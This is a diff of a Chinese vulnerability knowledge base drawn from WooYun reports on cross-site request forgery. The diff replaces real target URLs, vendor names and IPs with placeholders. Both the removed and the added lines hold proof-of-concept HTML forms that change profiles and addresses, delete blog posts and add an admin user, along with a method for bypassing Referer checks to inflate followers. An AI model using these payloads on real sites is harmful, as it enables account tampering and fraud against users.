+**详情**: <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>CSRF Hijack</title></head><body><form id="form_add_buy_btc" class="form-horizontal" method="post" action="https://example.com/[已脱敏]"><div class="control-group"><label class="control-label tx-red" for="zuijiamaijia">最佳买价：</label><div class="controls"><label id="zuijiamaijia" class="tx-red" onclick="$('#form_add_buy_btc #mairujia'
 
 **POC**: 之前的状态：漏洞表单：提交表单后跳转到火币网页面并成功扣除余额：
 
@@ -10905,7 +10905,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、<html><body><form action="http://www.coolpad.com/member/memberAddressAction!saveAddreass.do" method="POST"><input type="hidden" name="addressId" value="" /><input type="hidden" name="receiver" value="test" /><input type="hidden" name="province" value="373" /><input type="hidden" name="city" value="375" /><input type="hidden" name="district" value="404" /><input type="hidden" name="address" value
+**详情**: 1、<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="addressId" value="" /><input type="hidden" name="receiver" value="test" /><input type="hidden" name="province" value="373" /><input type="hidden" name="city" value="375" /><input type="hidden" name="district" value="404" /><input type="hidden" name="address" value
 
 **POC**: (见原文)
 
@@ -10929,7 +10929,7 @@
 
 **详情**: 修改个人信息的地方，存在csrf
 
-**POC**: PoC:<html><form action="http://www.duitang.com/people/profile/contact_info/" method=post><input type=text value="aaaaaaaa" name="name" /><input type=text value="15888888888" name="mobile" /><input type=text value="" name="citycode" /><input type=text value="" name="cityname" /><input type=text value
+**POC**: PoC:<html><form action="https://example.com/[已脱敏]" method=post><input type=text value="aaaaaaaa" name="name" /><input type=text value="15888888888" name="mobile" /><input type=text value="" name="citycode" /><input type=text value="" name="cityname" /><input type=text value
 
 **绕过**: 直接利用
 
@@ -10937,8 +10937,8 @@
 ---
 
 ---
-### [wooyun-2013-017294] 我是如何绕过新浪微博防御继续刷粉丝的
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017294] 我是如何绕过某社交平台某社交平台防御继续刷粉丝的
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -10949,13 +10949,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.我这里会说2个case，从最严重的开始吧！2.出问题的站点是微博媒体，看这里：http://media.weibo.com/profile.php?uid=1807689562&ref=3.点击关注，抓包看发送的请求：是一个POST请求！我再次以为会没戏：4.参数uid是你要关注的对象，fromuid是你自己，其他的都不重要，可以忽略，当然fromuid也可以忽略，我再尝试将碰到的N个POST改成GET的失败后，终于成功了一次，偷懒的程序员啊！构造如下链接http://media.weibo.com/attention/aj_addfollow.php?uid=1981622273&fromuid=uid当然是乌云的官方微博了撒！5.直接访问，是不行的，验证了referer！向上一篇漏洞所说，将它放在微博域下面，我首先直接将它发表在微博首页，点击访问，也是不行，看来referer验证的
+**详情**: 1.我这里会说2个case，从最严重的开始吧！2.出问题的站点是某社交平台媒体，看这里：https://example.com/[已脱敏]
 
-**POC**: 1.后面这个case和上面阐述的一样啦，大家可以略过了撒！2.微博又个频道叫着微刊：http://kan.weibo.com/在这里，微博用户可以主营一个刊物。其他用户如果喜欢可以订阅这个刊物，但是一旦订阅，就必须关注刊物的负责人！点击【订阅】，然后抓包，查看请求。擦，一个GET请求，订阅和关注刊主都是这一个链接做到的：http://kan.weibo.com/aj/subscribe?wid=3444217594949975&_t=0&__rnd=13580832225143.上述链接参数wid应该是微刊的唯一标识，其他两个参数可以忽略，我直接访问GET请求，返回如下，服务器就知道了我要CS
+**POC**: 1.后面这个case和上面阐述的一样啦，大家可以略过了撒！2.某社交平台又个频道叫着微刊：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给新浪找洞，要鼓励这种舍己为人的精神啊！
+**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给某社交平台找洞，要鼓励这种舍己为人的精神啊！
 ---
 
 ---
@@ -10973,7 +10973,7 @@
 
 **详情**: 该博客在对文章进行删除时，将文章id作为一个参数发出请求，所以第三方可以在用户没有关闭浏览器的这一段时间，制作post请求删除已知id的文章。
 
-**POC**: <html><body><form action="http://flyniuniu.blog.sohu.com/a/home/entry/delete.htm" method="POST"><input type="hidden" name="ids" value="310832966" /><input type="submit" value="Submit request" /></form></body></html>在用户flyniuniu登录过程中（关闭浏览器之前）构造此post请求，点击button，便可以把id为310832966的文章删除。
+**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="ids" value="310832966" /><input type="submit" value="Submit request" /></form></body></html>在用户flyniuniu登录过程中（关闭浏览器之前）构造此post请求，点击button，便可以把id为310832966的文章删除。
 
 **绕过**: 直接利用
 
@@ -10993,9 +10993,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /adminsoft/index.php?archive=management&action=managesava HTTP/1.1Host: 127.0.0.1Proxy-Connection: keep-aliveContent-Length: 127Accept: */*X-Requested-With: XMLHttpRequestOrigin: http://127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.1.2000 Chrome/30.0.1599.101 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encodi
+**详情**: POST /adminsoft/index.php?archive=management&action=managesava HTTP/1.1Host: [IP已脱敏]Proxy-Connection: keep-aliveContent-Length: 127Accept: */*X-Requested-With: XMLHttpRequestOrigin: http://[IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/[IP已脱敏]0 Chrome/30.0.1599.101 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encodi
 
-**POC**: <html><div style="display:none"><form action="http://127.0.0.1/adminsoft/index.php?archive=management&action=managesava" id="poc" name="poc" method="post"><input type="hidden" name="inputclass" value=""/><input type="hidden" name="tab" value=""/><input type="hidden" name="username" value=""/><input 
+**POC**: <html><div style="display:none"><form action="http://[IP已脱敏] id="poc" name="poc" method="post"><input type="hidden" name="inputclass" value=""/><input type="hidden" name="tab" value=""/><input type="hidden" name="username" value=""/><input 
 
 **绕过**: 直接利用
 
